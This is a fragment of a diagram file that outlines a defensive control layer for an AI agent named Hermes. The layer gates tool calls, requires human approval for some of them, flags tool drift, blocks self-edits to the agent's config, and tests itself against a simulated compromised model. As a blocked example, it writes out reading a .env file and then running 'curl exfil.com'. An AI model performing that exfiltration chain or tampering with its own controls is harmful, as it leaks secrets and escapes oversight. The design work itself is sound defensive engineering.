      "fontSize": 12,
      "fontFamily": 1,
      "textAlign": "left",
      "verticalAlign": "top",
      "containerId": null,
      "originalText": "KEY FLOWS:\n\n1. MODEL PROPOSES TOOL → Hermes pre_tool_call → Adapter builds Request → Normalizer → Evaluator (pure) → Decision\n   • ALLOW     → Tool runs → post_tool_call → Evidence (outcome) → transform_tool_result → Taint update → Evidence (taint)\n   • DENY      → Block returned to model → Evidence (blocked, would_block=false)\n   • APPROVAL  → Block with approval ID → Human approves out-of-band → Retry identical call → ALLOW once\n\n2. TAINT RULE (Lethal Trifecta):\n   read_file(.env) → sensitive_data_read = true\n   web_extract(untrusted_site) → untrusted_content_seen = true\n   terminal(curl exfil.com) → egress class + both flags → DENY (EGRESS_AFTER_TAINT)\n\n3. DRIFT DETECTION:\n   Session start / registry change → baseline diff → name/desc/schema changed → REQUIRE_APPROVAL\n\n4. SELF-PROTECTION:\n   Agent tries: write_file(~/.hermes/config.yaml) → Invariant DENY (compiled-in, policy cannot override)\n\n5. ATTACK LAB (Tier A):\n   Compromised-model simulator → Scripted hostile calls → Real Hermes + Plugin → Assert: DENY + handler NOT invoked",
